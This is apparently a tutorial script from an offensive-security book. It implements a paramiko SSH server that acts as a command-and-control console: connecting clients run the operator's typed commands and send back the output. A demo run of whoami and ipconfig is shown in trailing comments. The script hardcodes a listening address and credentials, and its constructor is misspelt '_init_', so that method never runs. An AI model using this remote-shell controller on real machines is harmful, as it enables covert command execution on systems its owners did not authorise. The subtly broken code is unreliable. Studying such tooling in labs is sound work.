# pip install paramiko

import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = '192.168.1.15'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)
    chan = bhSession.accept(20)

    if chan is None:
        print('*** No channel.')
        sys.exit(1)
    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command= input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()

## Kicking the Tires
## For the demo, we'll run the client on our (the authors?) Windows machine and the server on a Mac. Here we start up the server:
##     % python ssh_server.py
##     [+] Listening for connection ...
##     Now, on the Windows machine, we start the client:
##     C:\Users\tim>: $ python ssh_rcmd.py
##     Password:
##     Welcome to bh_ssh
##     And back on the server, we see the connection:
##     [+] Got a connection! from ('192.168.1.208', 61852)
##     [+] Authenticated!
##     ClientConnected
##     Enter command: whoami
##     desktop-cc91n7i\tim
## 
##     Enter command: ipconfig
##     Windows IP Configuration
##     <snip>
##     You can see that the client is successfully connected, at which point we run some commands. We don?t see anything in the SSH client, but the command we sent is executed on the client, and the output is sent to our SSH server.
